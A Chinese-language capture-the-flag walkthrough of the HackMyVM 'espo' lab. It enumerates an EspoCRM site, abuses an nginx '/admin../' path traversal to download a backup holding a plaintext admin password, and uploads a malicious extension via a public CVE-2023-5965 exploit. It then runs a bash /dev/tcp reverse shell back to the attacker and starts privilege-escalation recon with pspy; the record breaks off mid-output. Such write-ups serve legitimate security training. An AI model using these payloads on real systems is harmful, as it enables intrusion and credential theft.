# hmv_espo

# 0.简介

**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**难度**：黄色
**目标 IP**：192.168.205.236
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.踩点

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

是个登录栏，搜索一下有没有什么漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

只有权限提升漏洞，但是我们没有用户。爆破一下目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.236
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 162] [--> http://192.168.205.236/admin/]
/install              (Status: 301) [Size: 162] [--> http://192.168.205.236/install/]
/api                  (Status: 301) [Size: 162] [--> http://192.168.205.236/api/]
/index.php            (Status: 200) [Size: 2480]
/portal               (Status: 301) [Size: 162] [--> http://192.168.205.236/portal/]
/client               (Status: 301) [Size: 162] [--> http://192.168.205.236/client/]
/robots.txt           (Status: 200) [Size: 26]
Progress: 42982 / 311425 (13.80%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 44082 / 311425 (14.15%)
===============================================================
Finished
===============================================================
                                 
```

发现一点有意思的东西

![image](https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51)

![image](https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51)

貌似可以通过绕过读取文件夹外的文件，我们爆破试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://192.168.205.236/admin../FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   301        7 L      11 W       162 Ch      "admin"                                                             
000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
000008002:   301        7 L      11 W       162 Ch      "_oldsite"                                                          
000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   

Total time: 0
Processed Requests: 62284
Filtered Requests: 62279
Requests/sec.: 0

              
```

确实可以，我们继续爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://192.168.205.236/admin../_oldsite/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000167:   200        11 L     79 W       540 Ch      "info"                                                              
000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          

Total time: 34.86630
Processed Requests: 62284
Filtered Requests: 62280
Requests/sec.: 1786.366

                                           
```

有个文件，我们查看一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.236/admin../_oldsite/info
# Backup Configuration Settings
# This configuration file dictates the backup protocols for critical data storage.

# Directory for storing backup files
# All backup files are stored in compressed ZIP format for efficient space usage and security.
# Ensure that backups are regularly updated and verified for data integrity.

backup_directory: /admin/_oldsite
backup_format: zip
# Note: The backup directory is designated for ZIP file backups only. 
# Regular maintenance and checks are required to ensure data consistency and reliability.
                                                                                            
翻译
#备份配置设置
#该配置文件规定了关键数据存储的备份协议。
#备份文件存放目录
#所有备份文件都以压缩ZIP格式存储，以提高空间使用效率和安全性。
确保定期更新备份并验证数据完整性。
backup_directory:/admin/_oldsite
backup_format:zip
注意：指定的备份目录仅用于ZIP文件备份。
#需要定期维护和检查，确保数据的一致性和可靠性。
```

告诉了我们会保存备注文件，并且备份文件会以.zip为后缀，我们根据信息爆破一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ wfuzz -u "http://192.168.205.236/admin../_oldsite/FUZZ.zip" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ.zip
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000066:   200        139379   1377104    36126245    "backup"                                                            
                         L       W          Ch                                                                              

Total time: 36.69276
Processed Requests: 62284
Filtered Requests: 62283
Requests/sec.: 1697.446

                             
```

我们把备份文件下载下来

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ wget http://192.168.205.236/admin../_oldsite/backup.zip
--2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip
正在连接 192.168.205.236:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：37975754 (36M) [application/zip]
正在保存至: “backup.zip”

backup.zip                        100%[============================================================>]  36.22M  --.-KB/s  用时 0.08s   

2025-01-08 13:40:14 (464 MB/s) - 已保存 “backup.zip” [37975754/37975754])

                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ unzip backup.zip 

┌──(kali㉿kali)-[~/test/tmp]
└─$ ls
application  bootstrap.php    command.php  daemon.php     extension.php  install      public       vendor
backup.zip   clear_cache.php  cron.php     data           html           LICENSE.txt  rebuild.php  web.config
bin          client           custom       EspoCRM-7.2.4  index.php      preload.php  upgrade.php  websocket.php
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd data 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/data]
└─$ ls -la
总计 44
drwxrwxr-x  7 kali kali 4096 2023年12月 4日 .
drwxrwxr-x 12 kali kali 4096  1月 8日 13:40 ..
drwxrwxr-x  3 kali kali 4096 2023年12月 4日 .backup
drwxrwxr-x  3 kali kali 4096 2023年12月 4日 cache
-rw-rw-r--  1 kali kali  972 2023年12月 4日 config-internal.php
-rw-rw-r--  1 kali kali 5711 2023年12月 4日 config.php
-rw-rw-r--  1 kali kali    1 2023年12月 4日 .data
drwxr-xr-x  2 kali kali 4096 2023年12月 4日 logs
drwxrwxr-x  2 kali kali 4096 2023年12月 4日 tmp
drwxrwxr-x  4 kali kali 4096 2023年12月 4日 upload
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/data]
└─$ cat config.php                                            
<?php
return [
  'useCache' => true,
  'jobMaxPortion' => 15,
  'jobRunInParallel' => false,
  'jobPoolConcurrencyNumber' => 8,
  'daemonMaxProcessNumber' => 5,
  'daemonInterval' => 10,
  'daemonProcessTimeout' => 36000,
  'recordsPerPage' => 20,
  'recordsPerPageSmall' => 5,
  'recordsPerPageSelect' => 10,
  'applicationName' => 'EspoCRM',
  'version' => '7.2.4',
  'timeZone' => 'UTC',
  'dateFormat' => 'DD.MM.YYYY',
  'timeFormat' => 'HH:mm',
  'weekStart' => 0,
  'thousandSeparator' => ',',
  'decimalMark' => '.',
  'exportDelimiter' => ',',
  'currencyList' => [
    0 => 'EUR'
  ],
  'defaultCurrency' => 'EUR',
  'baseCurrency' => 'EUR',
  'currencyRates' => [],
  'outboundEmailIsShared' => true,
  'outboundEmailFromName' => 'EspoCRM',
  'outboundEmailFromAddress' => '',
  'smtpServer' => '',
  'smtpPort' => 25,
  'smtpAuth' => true,
  'smtpSecurity' => '',
  'smtpUsername' => 'admin',
  'smtpPassword' => '39Ue4kcVJ#YpaAV24CNmbWU',
  'language' => 'en_US',
  'authenticationMethod' => 'Espo',
  'globalSearchEntityList' => [
    0 => 'Account',
    1 => 'Contact',
    2 => 'Lead',
    3 => 'Opportunity'
  ],
  'tabList' => [
    0 => 'Account',
    1 => 'Contact',
    2 => 'Lead',
    3 => 'Opportunity',
    4 => 'Case',
    5 => 'Email',
    6 => 'Calendar',
    7 => 'Meeting',
    8 => 'Call',
    9 => 'Task',
    10 => '_delimiter_',
    11 => 'Document',
    12 => 'Campaign',
    13 => 'KnowledgeBaseArticle',
    14 => 'Stream',
    15 => 'User'
  ],
  'quickCreateList' => [
    0 => 'Account',
    1 => 'Contact',
    2 => 'Lead',
    3 => 'Opportunity',
    4 => 'Meeting',
    5 => 'Call',
    6 => 'Task',
    7 => 'Case',
    8 => 'Email'
  ],
  'exportDisabled' => false,
  'adminNotifications' => true,
  'adminNotificationsNewVersion' => true,
  'adminNotificationsCronIsNotConfigured' => true,
  'adminNotificationsNewExtensionVersion' => true,
  'assignmentEmailNotifications' => false,
  'assignmentEmailNotificationsEntityList' => [
    0 => 'Lead',
    1 => 'Opportunity',
    2 => 'Task',
    3 => 'Case'
  ],
  'assignmentNotificationsEntityList' => [
    0 => 'Meeting',
    1 => 'Call',
    2 => 'Task',
    3 => 'Email'
  ],
  'portalStreamEmailNotifications' => true,
  'streamEmailNotificationsEntityList' => [
    0 => 'Case'
  ],
  'streamEmailNotificationsTypeList' => [
    0 => 'Post',
    1 => 'Status',
    2 => 'EmailReceived'
  ],
  'emailNotificationsDelay' => 30,
  'emailMessageMaxSize' => 10,
  'notificationsCheckInterval' => 10,
  'maxEmailAccountCount' => 2,
  'followCreatedEntities' => false,
  'b2cMode' => false,
  'theme' => 'Espo',
  'themeParams' => (object) [
    'navbar' => 'side'
  ],
  'massEmailMaxPerHourCount' => 100,
  'massEmailVerp' => false,
  'personalEmailMaxPortionSize' => 50,
  'inboundEmailMaxPortionSize' => 50,
  'emailAddressLookupEntityTypeList' => [
    0 => 'User',
    1 => 'Contact',
    2 => 'Lead',
    3 => 'Account'
  ],
  'authTokenLifetime' => 0,
  'authTokenMaxIdleTime' => 48,
  'userNameRegularExpression' => '[^a-z0-9\\-@_\\.\\s]',
  'addressFormat' => 1,
  'displayListViewRecordCount' => true,
  'dashboardLayout' => [
    0 => (object) [
      'name' => 'My Espo',
      'layout' => [
        0 => (object) [
          'id' => 'default-activities',
          'name' => 'Activities',
          'x' => 2,
          'y' => 2,
          'width' => 2,
          'height' => 4
        ],
        1 => (object) [
          'id' => 'default-stream',
          'name' => 'Stream',
          'x' => 0,
          'y' => 0,
          'width' => 2,
          'height' => 4
        ]
      ]
    ]
  ],
  'calendarEntityList' => [
    0 => 'Meeting',
    1 => 'Call',
    2 => 'Task'
  ],
  'activitiesEntityList' => [
    0 => 'Meeting',
    1 => 'Call'
  ],
  'historyEntityList' => [
    0 => 'Meeting',
    1 => 'Call',
    2 => 'Email'
  ],
  'busyRangesEntityList' => [
    0 => 'Meeting',
    1 => 'Call'
  ],
  'emailAutoReplySuppressPeriod' => '2 hours',
  'emailAutoReplyLimit' => 5,
  'cleanupJobPeriod' => '1 month',
  'cleanupActionHistoryPeriod' => '15 days',
  'cleanupAuthTokenPeriod' => '1 month',
  'currencyFormat' => 2,
  'currencyDecimalPlaces' => 2,
  'aclAllowDeleteCreated' => false,
  'aclAllowDeleteCreatedThresholdPeriod' => '24 hours',
  'attachmentUploadMaxSize' => 256,
  'attachmentUploadChunkSize' => 4,
  'inlineAttachmentUploadMaxSize' => 20,
  'textFilterUseContainsForVarchar' => false,
  'tabColorsDisabled' => false,
  'massPrintPdfMaxCount' => 50,
  'emailKeepParentTeamsEntityList' => [
    0 => 'Case'
  ],
  'streamEmailWithContentEntityTypeList' => [
    0 => 'Case'
  ],
  'recordListMaxSizeLimit' => 200,
  'noteDeleteThresholdPeriod' => '1 month',
  'noteEditThresholdPeriod' => '7 days',
  'emailForceUseExternalClient' => false,
  'useWebSocket' => false,
  'auth2FAMethodList' => [
    0 => 'Totp'
  ],
  'personNameFormat' => 'firstLast',
  'newNotificationCountInTitle' => false,
  'pdfEngine' => 'Tcpdf',
  'smsProvider' => NULL,
  'defaultFileStorage' => 'EspoUploadDir',
  'ldapUserNameAttribute' => 'sAMAccountName',
  'ldapUserFirstNameAttribute' => 'givenName',
  'ldapUserLastNameAttribute' => 'sn',
  'ldapUserTitleAttribute' => 'title',
  'ldapUserEmailAddressAttribute' => 'mail',
  'ldapUserPhoneNumberAttribute' => 'telephoneNumber',
  'ldapUserObjectClass' => 'person',
  'ldapPortalUserLdapAuth' => false,
  'passwordGenerateLength' => 10,
  'massActionIdleCountThreshold' => 100,
  'exportIdleCountThreshold' => 1000,
  'cacheTimestamp' => 1701712486,
  'microtime' => 1701712486.097623,
  'siteUrl' => 'http://espo.hmv',
  'fullTextSearchMinLength' => 4,
  'appTimestamp' => 1701712486,
  'maintenanceMode' => NULL,
  'cronDisabled' => NULL
];
                                                    
```

在data文件夹中发现了配置文件，并且配置文件中有账号和密码，我们尝试登录

成功进入`EspoCRM`,查看一下他版本信息

![image](https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22)

搜索该版本有没有漏洞。通过搜索发现存在[上传文件漏洞](https://github.com/josemlwdf/CVE-2023-5965)，我们利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
正克隆到 'CVE-2023-5965'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
接收对象中: 100% (37/37), 12.33 KiB | 287.00 KiB/s, 完成.
处理 delta 中: 100% (14/14), 完成.
                                             
```

发现第一个通过更新无效，尝试第二个上传插件，成功上传并有反馈

![image](https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201)

![image](https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1)

弹一个反弹shell回来

```bash
# 执行语句
bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1"

┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 35578
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
www-data@espo:~/html/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.提权

```bash
www-data@espo:~/html/public$ ls -la
total 36
drwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 .
drwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..
drwxr-xr-x  3 www-data www-data 4096 Dec  4  2023 api
-rw-r--r--  1 www-data www-data 1689 Dec  4  2023 index.php
drwxr-xr-x  5 www-data www-data 4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data 1660 Dec  4  2023 oauth-callback.php
drwxr-xr-x  2 www-data www-data 4096 Dec  4  2023 portal
-rw-r--r--  1 www-data www-data   26 Dec  4  2023 robots.txt
-rw-r--r--  1 www-data www-data  302 Jan  8 06:52 webshell.php
www-data@espo:~/html/public$ cd ..
www-data@espo:~/html$ ls -la
total 136
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 .
drwxr-xr-x  4 root     root      4096 Dec  4  2023 ..
-rw-r--r--  1 www-data www-data  1153 Dec  4  2023 .htaccess
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 EspoCRM-7.2.4
-rw-r--r--  1 www-data www-data 35819 Dec  4  2023 LICENSE.txt
drwxr-xr-x  3 www-data www-data  4096 Dec  4  2023 application
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 bin
-rw-r--r--  1 www-data www-data  1498 Dec  4  2023 bootstrap.php
-rw-r--r--  1 www-data www-data  1543 Dec  4  2023 clear_cache.php
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 client
-rw-r--r--  1 www-data www-data  1536 Dec  4  2023 command.php
-rw-r--r--  1 www-data www-data  1531 Dec  4  2023 cron.php
drwxrwxr-x  3 www-data www-data  4096 Dec  4  2023 custom
-rw-r--r--  1 www-data www-data  1535 Dec  4  2023 daemon.php
drwxrwxr-x  7 www-data www-data  4096 Jan  8 06:52 data
-rw-r--r--  1 www-data www-data  2812 Dec  4  2023 extension.php
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 html
-rw-r--r--  1 www-data www-data  3170 Dec  4  2023 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 preload.php
drwxr-xr-x  5 www-data www-data  4096 Jan  8 06:52 public
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 rebuild.php
-rw-r--r--  1 www-data www-data  3034 Dec  4  2023 upgrade.php
drwxr-xr-x 39 www-data www-data  4096 Dec  4  2023 vendor
-rw-r--r--  1 www-data www-data  2534 Dec  4  2023 web.config
-rw-r--r--  1 www-data www-data  1541 Dec  4  2023 websocket.php
www-data@espo:~/html$ cd /home/
www-data@espo:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jan 24  2024 .
drwxr-xr-x 18 root   root   4096 Dec  4  2023 ..
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 mandie
www-data@espo:/home$ cd mandie/
www-data@espo:/home/mandie$ ls -al
total 48
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 .
drwxr-xr-x  3 root   root   4096 Jan 24  2024 ..
lrwxrwxrwx  1 root   root      9 Jan 26  2024 .bash_history -> /dev/null
-rw-r--r--  1 mandie mandie  220 Dec  4  2023 .bash_logout
-rw-r--r--  1 mandie mandie 3526 Dec  4  2023 .bashrc
drwxr-xr-x  3 mandie mandie 4096 Dec  4  2023 .local
drwxr-xr-x 12 mandie mandie 4096 Dec  4  2023 .oh-my-zsh
-rw-r--r--  1 mandie mandie  807 Dec  4  2023 .profile
-rw-r--r--  1 mandie mandie 3890 Dec  4  2023 .zshrc
-rwxr-xr--  1 mandie mandie  493 Dec  4  2023 copyPics
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 pictures
-rwx------  1 mandie mandie   33 Jan 24  2024 user.txt
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 videos
www-data@espo:/home/mandie$ cd copyPics 
bash: cd: copyPics: Not a directory
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2>/dev/null
    done
done
www-data@espo:/home/mandie$ cd /tmp/
www-data@espo:/tmp$ wget 192.168.205.141/pspy
--2025-01-08 06:56:53--  http://192.168.205.141/pspy
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3518724 (3.4M) [application/octet-stream]
Saving to: 'pspy'

pspy                                                         0%[                                                                       pspy                                                       100%[========================================================================================================================================>]   3.36M  --.-KB/s    in 0.02s   

2025-01-08 06:56:53 (172 MB/s) - 'pspy' saved [3518724/3518724]

www-data@espo:/tmp$ chmod +x pspy 
www-data@espo:/tmp$ ./pspy 
pspy - version: 1.2.1 - Commit SHA: kali


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░   
                               ░ ░   

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/01/08 06:57:08 CMD: UID=33    PID=2064   | ./pspy 
2025/01/08 06:57:08 CMD: UID=0     PID=2048   | /usr/bin/php -f cron.php 
2025/01/08 06:57:08 CMD: UID=0     PID=2047   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php > /dev/null 2>&1 
2025/01/08 06:57:08 CMD: UID=0     PID=2044   | /usr/sbin/CRON -f 
2025/01/08 06:57:08 CMD: UID=33    PID=2015   | bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2014   | sh -c bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2013   | script /dev/null -c bash 
2025/01/08 06:57:08 CMD: UID=0     PID=2011   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1990   | bash -i 
2025/01/08 06:57:08 CMD: UID=33    PID=1989   | bash -c bash -i >& /dev/tcp/192.168.205.141/8888 0>&1 
2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1" 
2025/01/08 06:57:08 CMD: UID=0     PID=1935   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1873   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1808   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1595   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1273   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1111   | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=109   PID=1042   | qmgr -l -t unix -u 
2025/01/08 06:57:08 CMD: UID=109   PID=1041   | pickup -l -t unix -u -c 
2025/01/08 06:57:08 CMD: UID=0     PID=1039   | /usr/lib/postfix/sbin/master -w 
2025/01/08 06:57:08 CMD: UID=108   PID=673    | /usr/sbin/mariadbd 
2025/01/08 06:57:08 CMD: UID=0     PID=629    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/01/08 06:57:08 CMD: UID=33    PID=609    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=608    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=544    | nginx: worker process                          
2025/01/08 06:57:08 CMD: UID=0     PID=540    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/01/08 06:57:08 CMD: UID=0     PID=531    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/01/08 06:57:08 CMD: UID=0     PID=509    | php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                     
2025/01/08 06:57:08 CMD: UID=0     PID=489    | /usr/sbin/ModemManager 
2025/01/08 06:57:08 CMD: UID=0     PID=461    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2025/01/08 06:57:08 CMD: UID=0     PID=432    | 
2025/01/08 06:57:08 CMD: UID=0     PID=421    | /lib/systemd/systemd-logind 
2025/01/08 06:57:08 CMD: UID=996   PID=414    | /usr/lib/polkit-1/polkitd --no-debug 
2025/01/08 06:57:08 CMD: UID=100   PID=411    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                    
2025/01/08 06:57:08 CMD: UID=0     PID=410    | /usr/sbin/cron -f 
2025/01/08 06:57:08 CMD: UID=0     PID=389    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                 
2025/01/08 06:57:08 CMD: UID=0     PID=303    | 
2025/01/08 06:57:08 CMD: UID=997   PID=284    | /lib/systemd/systemd-timesyncd 
2025/01/08 06:57:08 CMD: UID=0     PID=242    | /lib/systemd/systemd-udevd 
2025/01/08 06:57:08 CMD: UID=0     PID=218    | /lib/systemd/systemd-journald 
2025/01/08 06:57:08 CMD: UID=0     PID=174    | 
2025/01/08 06:57:08 CMD: UID=0     PID=173    | 
2025/01/08 06:57:08 CMD: UID=0     PID=141    | 
2025/01/08 06:57:08 CMD: UID=0     PID=134    | 
2025/01/08 06:57:08 CMD: UID=0     PID=133    | 
2025/01/08 06:57:08 CMD: UID=0     PID=132    | 
2025/01/08 06:57:08 CMD: UID=0     PID=131    | 
2025/01/08 06:57:08 CMD: UID=0     PID=130    | 
2025/01/08 06:57:08 CMD: UID=0     PID=129    | 
2025/01/08 06:57:08 CMD: UID=0     PID=126    | 
2025/01/08 06:57:08 CMD: UID=0     PID=59     | 
2025/01/08 06:57:08 CMD: UID=0     PID=58     | 
2025/01/08 06:57:08 CMD: UID=0     PID=53     | 
2025/01/08 06:57:08 CMD: UID=0     PID=48     | 
2025/01/08 06:57:08 CMD: UID=0     PID=47     | 
2025/01/08 06:57:08 CMD: UID=0     PID=46     | 
2025/01/08 06:57:08 CMD: UID=0     PID=44     | 
2025/01/08 06:57:08 CMD: UID=0     PID=38     | 
2025/01/08 06:57:08 CMD: UID=0     PID=37     | 
2025/01/08 06:57:08 CMD: UID=0     PID=36     | 
2025/01/08 06:57:08 CMD: UID=0     PID=35     | 
2025/01/08 06:57:08 CMD: UID=0     PID=34     | 
2025/01/08 06:57:08 CMD: UID=0     PID=33     | 
2025/01/08 06:57:08 CMD: UID=0     PID=32     | 
2025/01/08 06:57:08 CMD: UID=0     PID=31     | 
2025/01/08 06:57:08 CMD: UID=0     PID=30     | 
2025/01/08 06:57:08 CMD: UID=0     PID=29     | 
2025/01/08 06:57:08 CMD: UID=0     PID=28     | 
2025/01/08 06:57:08 CMD: UID=0     PID=27     | 
2025/01/08 06:57:08 CMD: UID=0     PID=24     | 
2025/01/08 06:57:08 CMD: UID=0     PID=23     | 
2025/01/08 06:57:08 CMD: UID=0     PID=22     | 
2025/01/08 06:57:08 CMD: UID=0     PID=21     | 
2025/01/08 06:57:08 CMD: UID=0     PID=20     | 
2025/01/08 06:57:08 CMD: UID=0     PID=18     | 
2025/01/08 06:57:08 CMD: UID=0     PID=16     | 
2025/01/08 06:57:08 CMD: UID=0     PID=15     | 
2025/01/08 06:57:08 CMD: UID=0     PID=14     | 
2025/01/08 06:57:08 CMD: UID=0     PID=13     | 
2025/01/08 06:57:08 CMD: UID=0     PID=12     | 
2025/01/08 06:57:08 CMD: UID=0     PID=11     | 
2025/01/08 06:57:08 CMD: UID=0     PID=10     | 
2025/01/08 06:57:08 CMD: UID=0     PID=6      | 
2025/01/08 06:57:08 CMD: UID=0     PID=5      | 
2025/01/08 06:57:08 CMD: UID=0     PID=4      | 
2025/01/08 06:57:08 CMD: UID=0     PID=3      | 
2025/01/08 06:57:08 CMD: UID=0     PID=2      | 
2025/01/08 06:57:08 CMD: UID=0     PID=1      | /sbin/init 
2025/01/08 06:58:01 CMD: UID=0     PID=2072   | /usr/sbin/CRON -f 
